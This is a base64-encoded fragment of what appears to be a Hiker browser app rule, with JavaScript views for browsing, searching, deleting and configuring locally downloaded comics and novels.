YXRoKSkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGVhck15VmFyKFxcXFxcXFwiLnRnbnVtXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+WIoOmZpOaIkOWKn1xcXFxcXFwiO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5Yig6Zmk5aSx6LSlXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSwgaXQucGF0aCk7XFxcXG4gICAgICAgICAgICAgICAgICAgIH1lbHNle1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9wYWdlL0Jvb2tyYWNrLnZpZXc/cnVsZT3mnKzlnLDotYTmupDnrqHnkIYmcnVsZU5hbWU9XFxcXFxcXCIraXQubmFtZStcXFxcXFxcIiZ0eXBlPVxcXFxcXFwiK3R5cGU7XFxcXG4gICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICB9LCBpdCwgdHlwZSlcXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgbGF5b3V0LnB1c2goe1xcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBpdC5uYW1lLFxcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInNjcm9sbF9idXR0b25cXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZShpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCIudGdudW1cXFxcXFxcIiwgaSk7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgICB9LCBpKSxcXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICB9XFxcXG4gICAgfVxcXFxuICAgIGxldCBwYXRoID0gdGFnW3RnbnVtXS5wYXRoO1xcXFxuICAgIGxldCBtaGxpc3QgPSBGaWxlLmdldEZpbGVQYXRoKHBhdGgsIFxcXFxcXFwiZGlyXFxcXFxcXCIpO1xcXFxuXFxcXG4gICAgaWYgKG1obGlzdC5sZW5ndGggPT09IDApIHtcXFxcbiAgICAgICAgbGF5b3V0LnB1c2goe1xcXFxuICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi4oCc4oCc4oCd4oCdXFxcXFxcXCIgKyBcXFxcXFxcIuWVpemDveayoeacieiAtlxcXFxcXFwiLmJpZygpLFxcXFxuICAgICAgICAgICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfY2VudGVyXzFcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgbGluZVZpc2libGU6IGZhbHNlXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0pO1xcXFxuICAgICAgICByZXR1cm4gc2V0UmVzdWx0KGxheW91dCk7XFxcXG4gICAgfVxcXFxuICAgIGxldCBwYWdlVXJsID0gdHlwZSA9PT0gXFxcXFxcXCJub3ZlbFxcXFxcXFwiID8gXFxcXFxcXCJoaWtlcjovL3BhZ2UvTm92ZWxCcm93c2VyLnZpZXdcXFxcXFxcIiA6IFxcXFxcXFwiaGlrZXI6Ly9wYWdlL0NvbWljQnJvd3Nlci52aWV3XFxcXFxcXCI7XFxcXG4gICAgZm9yIChsZXQgaXRlbSBvZiBtaGxpc3QpIHtcXFxcbiAgICAgICAgbGV0IHBpYyA9IGZpbGVFeGlzdChcXFxcXFxcImZpbGU6Ly9cXFxcXFxcIiArIGl0ZW0ucGF0aCArIFxcXFxcXFwiL1xcXFxcXFwiICsgaXRlbS5uYW1lICsgXFxcXFxcXCIuanBnXFxcXFxcXCIpID8gaXRlbS5wYXRoICsgXFxcXFxcXCIvXFxcXFxcXCIgKyBpdGVtLm5hbWUgKyBcXFxcXFxcIi5qcGdcXFxcXFxcIiA6IENvbmZpZy5kZWZfUGljO1xcXFxuICAgICAgICBsZXQgbmFtZXM9U3RyaW5nKGl0ZW0ubmFtZSkuc3BsaXQoXFxcXFxcXCIkXFxcXFxcXCIpO1xcXFxuICAgICAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgICAgICB0aXRsZTogbmFtZXNbMF0sXFxcXG4gICAgICAgICAgICBkZXNjOiBuYW1lc1sxXSxcXFxcbiAgICAgICAgICAgIHBpY191cmw6IHBpYyxcXFxcbiAgICAgICAgICAgIHVybDogdHlwZSA9PT0gXFxcXFxcXCJub3ZlbFxcXFxcXFwiID9wYWdlVXJsICsgXFxcXFxcXCI/cnVsZT1cXFxcXFxcIiArIE1ZX1JVTEUudGl0bGU6JChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKChwYWdlVXJsLCBwYXRoKT0+e1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiAkLnJlcXVpcmUoXFxcXFxcXCJsb25nUHJlc3MuanNcXFxcXFxcIikuc2luZ2xlRW50ZXIocGFnZVVybCwgcGF0aCk7XFxcXG4gICAgICAgICAgICB9LCBwYWdlVXJsLCBpdGVtLnBhdGgpLFxcXFxuICAgICAgICAgICAgZXh0cmE6IE9iamVjdC5hc3NpZ24oaXRlbSwge1xcXFxuICAgICAgICAgICAgICAgIGxvbmdDbGljazogW3tcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi5Yig6ZmkXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIGpzOiAkLnRvU3RyaW5nKChwYXRoKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJC5yZXF1aXJlKFxcXFxcXFwibG9uZ1ByZXNzLmpzXFxcXFxcXCIpLmRlbGV0ZUZpbGVGb3JCb29rKHBhdGgpXFxcXG4gICAgICAgICAgICAgICAgICAgIH0sIGl0ZW0ucGF0aClcXFxcbiAgICAgICAgICAgICAgICB9XSxcXFxcbiAgICAgICAgICAgICAgICBpZDogaXRlbS5wYXRoXFxcXG4gICAgICAgICAgICB9KVxcXFxuICAgICAgICB9KTtcXFxcbiAgICB9XFxcXG4gICAgc2V0UmVzdWx0KGxheW91dCk7XFxcXG59XFxcXG5cXFxcbm1haW4oKTtcXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwidGV4dF8xXFxcIixcXFwibmFtZVxcXCI6XFxcIiN2Lua8q+eUu+eroOiKguWIl+ihqFxcXCIsXFxcInBhdGhcXFwiOlxcXCJDb21pY0Jyb3dzZXIudmlld1xcXCIsXFxcInJ1bGVcXFwiOlxcXCJqczpcXFxcbmNvbnN0IFRvb2wgPSAkLnJlcXVpcmUoXFxcXFxcXCJUb29sLmpzXFxcXFxcXCIpO1xcXFxuY29uc3QgQ29uZmlnID0gJC5yZXF1aXJlKFxcXFxcXFwiQ29uZmlnLmpzXFxcXFxcXCIpO1xcXFxuY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFxcXFxcIkZpbGUuanNcXFxcXFxcIik7XFxcXG5pZiAoZ2V0UGFyYW0oXFxcXFxcXCJoYXNQYXJhbXNcXFxcXFxcIikgPT09IFxcXFxcXFwidHJ1ZVxcXFxcXFwiKSB7XFxcXG4gICAgTVlfUEFSQU1TID0ge1xcXFxuICAgICAgICBwYXRoOiBkZWNvZGVVUklDb21wb25lbnQoZ2V0UGFyYW0oXFxcXFxcXCJwYXRoXFxcXFxcXCIpKSxcXFxcbiAgICAgICAgbmFtZTogZGVjb2RlVVJJQ29tcG9uZW50KGdldFBhcmFtKFxcXFxcXFwibmFtZVxcXFxcXFwiKSksXFxcXG4gICAgICAgIGJvb2tOYW1lOiBkZWNvZGVVUklDb21wb25lbnQoZ2V0UGFyYW0oXFxcXFxcXCJib29rTmFtZVxcXFxcXFwiKSksXFxcXG4gICAgICAgIHJ1bGVOYW1lOiBkZWNvZGVVUklDb21wb25lbnQoZ2V0UGFyYW0oXFxcXFxcXCJydWxlTmFtZVxcXFxcXFwiKSksXFxcXG4gICAgICAgIGNvbWljU3R5bGU6IGdldFBhcmFtKFxcXFxcXFwiY29taWNTdHlsZVxcXFxcXFwiKVxcXFxuICAgIH1cXFxcbn1cXFxcbmxldCBwYXRoID0gTVlfUEFSQU1TLnBhdGg7XFxcXG5pZiAoIXBhdGgpIHtcXFxcbiAgICBwYXRoID0gQ29uZmlnLmNvbWljUGF0aCArIFxcXFxcXFwiL1xcXFxcXFwiICsgTVlfUEFSQU1TLnJ1bGVOYW1lICsgXFxcXFxcXCIvXFxcXFxcXCIgKyBNWV9QQVJBTVMuYm9va05hbWU7XFxcXG59XFxcXG5pZiAoTVlfUEFSQU1TLmNvbWljU3R5bGUpIHtcXFxcbiAgICBDb25maWcuZGVmX0NvbWljX1N0eWxlID0gTVlfUEFSQU1TLmNvbWljU3R5bGU7XFxcXG59XFxcXG5zZXRQYWdlVGl0bGUoXFxcXFxcXCJDVnxcXFxcXFxcIiArIChNWV9QQVJBTVMubmFtZSB8fCBGaWxlLmdldE5hbWUocGF0aCkpKTtcXFxcblxcXFxudmFyIGxheW91dCA9IFtdO1xcXFxubGV0IG1vZGUgPSBnZXRNeVZhcihcXFxcXFxcIi5tb2RlXFxcXFxcXCIsIFxcXFxcXFwiMFxcXFxcXFwiKTtcXFxcbmxldCBpc1JldmVyc2UgPSBnZXRNeVZhcihcXFxcXFxcIi5pc1JldmVyc2VcXFxcXFxcIiwgXFxcXFxcXCIwXFxcXFxcXCIpO1xcXFxuYWRkTGlzdGVuZXIoXFxcXFxcXCJvbkNsb3NlXFxcXFxcXCIsICQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgIGNsZWFyTXlWYXIoXFxcXFxcXCIubW9kZVxcXFxcXFwiKTtcXFxcbiAgICBjbGVhck15VmFyKFxcXFxcXFwiLmlzUmV2ZXJzZVxcXFxcXFwiKTtcXFxcbn0pKTtcXFxcbmNvbnN0IGNvbWljU3RhdHVzID0gbmV3IE1hcChbXFxcXG4gICAgW1xcXFxcXFwiQVxcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiXSxcXFxcbiAgICBbXFxcXFxcXCJCXFxcXFxcXCIsIFxcXFxcXFwi4oCY4oCYW+acquWujOaIkF3igJnigJlcXFxcXFxcIl1cXFxcbl0pO1xcXFxuXFxcXG5mdW5jdGlvbiBnZXRUaXRsZSh0aXRsZSkge1xcXFxuICAgIGxldCB0aXRsZXMgPSBUb29sLnNwbGl0KHRpdGxlLCBcXFxcXFxcIiRcXFxcXFxcIiwgMik7XFxcXG4gICAgcmV0dXJuIGNvbWljU3RhdHVzLmdldCh0aXRsZXNbMV0pICsgdGl0bGVzWzJdIHx8IHRpdGxlO1xcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBnZXRUaXRsZTIodGl0bGUpIHtcXFxcbiAgICBsZXQgdGl0bGVzID0gVG9vbC5zcGxpdCh0aXRsZSwgXFxcXFxcXCIkXFxcXFxcXCIsIDIpO1xcXFxuICAgIHJldHVybiB0aXRsZXNbMl0gfHwgdGl0bGU7XFxcXG59XFxcXG5sYXlvdXQucHVzaCh7XFxcXG4gICAgdGl0bGU6IFxcXFxcXFwi5Yig6Zmk5pW05pysXFxcXFxcXCIsXFxcXG4gICAgdXJsOiAkKFxcXFxcXFwi56Gu6K6k5Yig6Zmk5pW05pys5ryr55S777yfXFxcXFxcXCIpLmNvbmZpcm0oKHBhdGgpID0+IHtcXFxcbiAgICAgICAgY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9GaWxlLmpzXFxcXFxcXCIpO1xcXFxuICAgICAgICBpZiAoRmlsZS5kZWxldGVGaWxlcyhwYXRoKSkge1xcXFxuICAgICAgICAgICAgYmFjaygpO1xcXFxuICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/liKDpmaTmiJDlip9cXFxcXFxcIjtcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5Yig6Zmk5aSx6LSlXFxcXFxcXCI7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9LCBwYXRoKSxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzJcXFxcXFxcIlxcXFxufSk7XFxcXG5sYXlvdXQucHVzaCh7XFxcXG4gICAgdGl0bGU6IFtcXFxcXFxcIueci+a8q+eUu1xcXFxcXFwiLCBcXFxcXFxcIuWIoOmZpOeroOiKglxcXFxcXFwiXVttb2RlXSxcXFxcbiAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgobW9kZSkgPT4ge1xcXFxuICAgICAgICBwdXRNeVZhcihcXFxcXFxcIi5tb2RlXFxcXFxcXCIsIG1vZGUgPT09IFxcXFxcXFwiMFxcXFxcXFwiID8gXFxcXFxcXCIxXFxcXFxcXCIgOiBcXFxcXFxcIjBcXFxcXFxcIik7XFxcXG4gICAgICAgIHJlZnJlc2hQYWdlKHRydWUpO1xcXFxuICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCJcXFxcbiAgICB9LCBtb2RlKSxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzJcXFxcXFxcIlxcXFxufSk7XFxcXG5sYXlvdXQucHVzaCh7XFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwibGluZV9ibGFua1xcXFxcXFwiXFxcXG59KVxcXFxubGV0IG1obGlzdCA9IEZpbGUuZ2V0RmlsZVBhdGgocGF0aCwgXFxcXFxcXCJkaXJcXFxcXFxcIik7XFxcXG5taGxpc3Quc29ydCgoYSwgYikgPT4ge1xcXFxuICAgIGEgPSAoYS5uYW1lLm1hdGNoKC9cXFxcXFxcXGQrLykgfHwgW10pWzBdIHx8IDA7XFxcXG4gICAgYiA9IChiLm5hbWUubWF0Y2goL1xcXFxcXFxcZCsvKSB8fCBbXSlbMF0gfHwgMDtcXFxcbiAgICByZXR1cm4gYSAtIGI7XFxcXG59KTtcXFxcblxcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIuKAnOKAnOKAneKAnVxcXFxcXFwiICsgXFxcXFxcXCLnq6DoioIgXFxcXFxcXCIuYmlnKCkgKyAoXFxcXFxcXCLlhbHmnIk6XFxcXFxcXCIgKyBtaGxpc3QubGVuZ3RoICsgXFxcXFxcXCLnq6BcXFxcXFxcIikuc21hbGwoKSxcXFxcbiAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgoaXNSZXZlcnNlKSA9PiB7XFxcXG4gICAgICAgIHB1dE15VmFyKFxcXFxcXFwiLmlzUmV2ZXJzZVxcXFxcXFwiLCBpc1JldmVyc2UgPT09IFxcXFxcXFwiMFxcXFxcXFwiID8gXFxcXFxcXCIxXFxcXFxcXCIgOiBcXFxcXFxcIjBcXFxcXFxcIik7XFxcXG4gICAgICAgIHJlZnJlc2hQYWdlKHRydWUpO1xcXFxuICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCJcXFxcbiAgICB9LCBpc1JldmVyc2UpLFxcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMVxcXFxcXFwiXFxcXG59KTtcXFxcbmxldCBhcnJheSA9IFtdO1xcXFxuXFxcXG5pZiAobW9kZSA9PT0gXFxcXFxcXCIwXFxcXFxcXCIpIHtcXFxcbiAgICBpZiAoQ29uZmlnLmRlZl9pc0NvbWljQ29tcGF0aWJsZSA9PT0gXFxcXFxcXCIwXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgbGV0IGxhenkgPSAkKFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoKCkgPT4ge1xcXFxuICAgICAgICAgICAgY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9GaWxlLmpzXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgbGV0IGZpbGVsaXN0ID0gRmlsZS5nZXRGaWxlUGF0aChpbnB1dCk7XFxcXG4gICAgICAgICAgICBsZXQgc2hvcnRlbiA9IGlucHV0LnJlcGxhY2UoZ2V0UGF0aChcXFxcXFxcImhpa2VyOi8vZmlsZXMvXFxcXFxcXCIpLnNsaWNlKDcpLCBcXFxcXFxcImhpa2VyOi8vZmlsZXMvXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgbGV0IHBpY2xpc3QgPSBmaWxlbGlzdC5tYXAoKGl0ZW0sIGkpID0+IHNob3J0ZW4gKyBcXFxcXFxcIi9cXFxcXFxcIiArIChpICsgMSkgKyBcXFxcXFxcIi5qcGdcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJwaWNzOi8vXFxcXFxcXCIgKyBwaWNsaXN0LmpvaW4oXFxcXFxcXCImJlxcXFxcXFwiKTtcXFxcbiAgICAgICAgfSk7XFxcXG4gICAgICAgIGZvciAobGV0IGl0ZW0gb2YgbWhsaXN0KSB7XFxcXG4gICAgICAgICAgICBsZXQgdGl0bGUgPSBnZXRUaXRsZShpdGVtLm5hbWUpO1xcXFxuICAgICAgICAgICAgYXJyYXkucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IHRpdGxlLFxcXFxuICAgICAgICAgICAgICAgIHVybDogaXRlbS5wYXRoICsgbGF6eSxcXFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogQ29uZmlnLmRlZl9Db21pY19TdHlsZSxcXFxcbiAgICAgICAgICAgICAgICBwaWNfdXJsOiBpdGVtLnBhdGggKyBcXFxcXFxcIi8xLmpwZ1xcXFxcXFwiXFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgfVxcXFxuICAgIH0gZWxzZSB7XFxcXG4gICAgICAgIGZvciAobGV0IGl0ZW0gb2YgbWhsaXN0KSB7XFxcXG4gICAgICAgICAgICBsZXQgdGl0bGUgPSBnZXRUaXRsZShpdGVtLm5hbWUpO1xcXFxuICAgICAgICAgICAgYXJyYXkucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IHRpdGxlLFxcXFxuICAgICAgICAgICAgICAgIHVybDogXFxcXFxcXCJoaWtlcjovL3BhZ2UvY29taWNDb21wYXRpYmxlLnZpZXcjYXV0b1BhZ2UjI3JlYWRUaGVtZSM/cGF0aD1cXFxcXFxcIiArIGVuY29kZVVSSUNvbXBvbmVudChpdGVtLnBhdGgpLFxcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBDb25maWcuZGVmX0NvbWljX1N0eWxlLFxcXFxuICAgICAgICAgICAgICAgIHBpY191cmw6IGl0ZW0ucGF0aCArIFxcXFxcXFwiLzEuanBnXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgcGF0aDogaXRlbS5wYXRoLFxcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogZ2V0VGl0bGUyKGl0ZW0ubmFtZSlcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgfVxcXFxuICAgIH1cXFxcblxcXFxufSBlbHNlIHtcXFxcbiAgICBmb3IgKGxldCBpdGVtIG9mIG1obGlzdCkge1xcXFxuICAgICAgICBsZXQgbmFtZSA9IGdldFRpdGxlMihpdGVtLm5hbWUpO1xcXFxuICAgICAgICBhcnJheS5wdXNoKHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiBuYW1lLFxcXFxuICAgICAgICAgICAgdXJsOiAkKFxcXFxcXFwi56Gu6K6k5Yig6ZmkW1xcXFxcXFwiICsgbmFtZSArIFxcXFxcXFwiXe+8n1xcXFxcXFwiKS5jb25maXJtKChwYXRoKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9GaWxlLmpzXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgIGlmIChGaWxlLmRlbGV0ZUZpbGVzKHBhdGgpKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKHRydWUpO1xcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+WIoOmZpOaIkOWKn1xcXFxcXFwiO1xcXFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5Yig6Zmk5aSx6LSlXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSwgaXRlbS5wYXRoKSxcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBDb25maWcuZGVmX0NvbWljX1N0eWxlLFxcXFxuICAgICAgICAgICAgcGljX3VybDogaXRlbS5wYXRoICsgXFxcXFxcXCIvMS5qcGdcXFxcXFxcIlxcXFxuICAgICAgICB9KTtcXFxcbiAgICB9XFxcXG59XFxcXG5pZiAoaXNSZXZlcnNlID09PSBcXFxcXFxcIjFcXFxcXFxcIikge1xcXFxuICAgIGFycmF5LnJldmVyc2UoKTtcXFxcbn1cXFxcbmxheW91dC5wdXNoLmFwcGx5KGxheW91dCwgYXJyYXkpO1xcXFxuc2V0UmVzdWx0KGxheW91dCk7XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwiI3Yu6IGa5ZCI5pCc57SiXFxcIixcXFwicGF0aFxcXCI6XFxcIlNlYXJjaC52aWV3XFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxuY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9GaWxlLmpzP3J1bGU9XFxcXFxcXCIgKyBNWV9SVUxFLl90aXRsZSk7XFxcXG5jb25zdCBDb25maWcgPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvQ29uZmlnLmpzP3J1bGU9XFxcXFxcXCIgKyBNWV9SVUxFLl90aXRsZSk7XFxcXG5sZXQgY29taWNSdWxlRGlycyA9IEZpbGUuZ2V0RmlsZVBhdGgoQ29uZmlnW2dldFBhcmFtKFxcXFxcXFwidHlwZVxcXFxcXFwiKSArIFxcXFxcXFwiUGF0aFxcXFxcXFwiXSwgXFxcXFxcXCJkaXJcXFxcXFxcIik7XFxcXG5pZiAoZ2V0UGFyYW0oXFxcXFxcXCJpc0FsbFxcXFxcXFwiKSA9PT0gXFxcXFxcXCIxXFxcXFxcXCIpIHtcXFxcbiAgICBjb21pY1J1bGVEaXJzID0gY29taWNSdWxlRGlycy5maWx0ZXIoaXRlbSA9PiBpdGVtLm5hbWUgPT09IE1ZX1JVTEUudGl0bGUpO1xcXFxufVxcXFxuXFxcXG5sZXQgc2VhcmNoUmVzdWx0ID0gW107XFxcXG5sZXQgc2VhcmNoVGVybXM9IGdldFBhcmFtKFxcXFxcXFwic2VhcmNoVGVybXNcXFxcXFxcIik7XFxcXG5sZXQgc2VhcmNoVGVzdDtcXFxcblxcXFxuaWYgKCFnZXRTZWFyY2hNb2RlKCkpIHtcXFxcbiAgICBsZXQgdGVybXNBcnIgPSBzZWFyY2hUZXJtcy5zcGxpdChcXFxcXFxcIlxcXFxcXFwiKS5tYXAodCA9PiB0LnJlcGxhY2UoL1xcXFxcXFxcKnxcXFxcXFxcXC58XFxcXFxcXFw/fFxcXFxcXFxcK3xcXFxcXFxcXCR8XFxcXFxcXFxefFxcXFxcXFxcW3xcXFxcXFxcXF18XFxcXFxcXFwofFxcXFxcXFxcKXxcXFxcXFxcXHt8XFxcXFxcXFx9fFxcXFxcXFxcfHxcXFxcXFxcXC98XFxcXFxcXFxcXFxcXFxcXC9nLCBrID0+IFxcXFxcXFwiXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFwiICsgaykpO1xcXFxuICAgIGxldCByZWcgPSBuZXcgUmVnRXhwKHRlcm1zQXJyLmpvaW4oXFxcXFxcXCIuKlxcXFxcXFwiKSwgXFxcXFxcXCJpXFxcXFxcXCIpO1xcXFxuICAgIHNlYXJjaFRlc3QgPSB0ZXh0ID0+IHJlZy50ZXN0KHRleHQpO1xcXFxufSBlbHNlIHtcXFxcbiAgICBzZWFyY2hUZXN0ID0gdGV4dCA9PiBzZWFyY2hDb250YWlucyh0ZXh0LCBzZWFyY2hUZXJtcywgZmFsc2UpO1xcXFxufVxcXFxuXFxcXG5sZXQgcGFnZVVybCA9IGdldFBhcmFtKFxcXFxcXFwidHlwZVxcXFxcXFwiKSA9PT0gXFxcXFxcXCJub3ZlbFxcXFxcXFwiID8gXFxcXFxcXCJoaWtlcjovL3BhZ2UvTm92ZWxCcm93c2VyLnZpZXdcXFxcXFxcIiA6IFxcXFxcXFwiaGlrZXI6Ly9wYWdlL0NvbWljQnJvd3Nlci52aWV3XFxcXFxcXCI7XFxcXG5mb3IgKGxldCBzb25EaXIgb2YgY29taWNSdWxlRGlycykge1xcXFxuICAgIGxldCBjb21pY0xpc3QgPSBGaWxlLmdldEZpbGVQYXRoKHNvbkRpci5wYXRoLCBcXFxcXFxcImRpclxcXFxcXFwiKTtcXFxcbiAgICBmb3IgKGxldCBjb21pYyBvZiBjb21pY0xpc3QpIHtcXFxcbiAgICAgICAgaWYgKHNlYXJjaFRlc3QoY29taWMubmFtZSkpIHtcXFxcbiAgICAgICAgICAgIHNlYXJjaFJlc3VsdC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogY29taWMubmFtZSxcXFxcbiAgICAgICAgICAgICAgICBwaWNfdXJsOiBjb21pYy5wYXRoICsgXFxcXFxcXCIvXFxcXFxcXCIgKyBjb21pYy5uYW1lICsgXFxcXFxcXCIuanBnXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgdXJsOiBwYWdlVXJsICsgXFxcXFxcXCI/cnVsZT1cXFxcXFxcIiArIE1ZX1JVTEUuX3RpdGxlLFxcXFxuICAgICAgICAgICAgICAgIGRlc2M6IHNvbkRpci5uYW1lLFxcXFxuICAgICAgICAgICAgICAgIGV4dHJhOiBjb21pY1xcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9XFxcXG5cXFxcbn1cXFxcbnNldFJlc3VsdChzZWFyY2hSZXN1bHQpO1xcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIiN2Luiuvue9rlxcXCIsXFxcInBhdGhcXFwiOlxcXCJTZXR0aW5nLnZpZXdcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG5zZXRQYWdlVGl0bGUoTVlfUlVMRS50aXRsZSArIFxcXFxcXFwifOiuvue9rlxcXFxcXFwiKTtcXFxcbmNvbnN0IENvbmZpZyA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9Db25maWcuanNcXFxcXFxcIik7XFxcXG5cXFxcbmxldCBsYXlvdXQgPSBbXTtcXFxcblxcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIjxzdHJvbmc+5Z+656GA6K6+572uPC9zdHJvbmc+XFxcXFxcXCIuYmlnKCksXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwicmljaF90ZXh0XFxcXFxcXCJcXFxcbn0pO1xcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcImxpbmVcXFxcXFxcIlxcXFxufSk7XFxcXG5sYXlvdXQucHVzaCh7XFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwibGluZVxcXFxcXFwiXFxcXG59KTtcXFxcblxcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIuebruW9lei3r+W+hFxcXFxcXFwiLFxcXFxuICAgIHVybDogXFxcXFxcXCJoaWtlcjovL3BhZ2UvU2V0dGluZy9Nb3JlLnZpZXcjbm9SZWZyZXNoIyNub1JlY29yZEhpc3RvcnkjI25vSGlzdG9yeSM/c2V0dGluZ1R5cGU9Y29udGVudHNcXFxcXFxcIixcXFxcbiAgICBkZXNjOiBDb25maWcuaG9tZVBhdGgsXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8xXFxcXFxcXCJcXFxcbn0pO1xcXFxubGF5b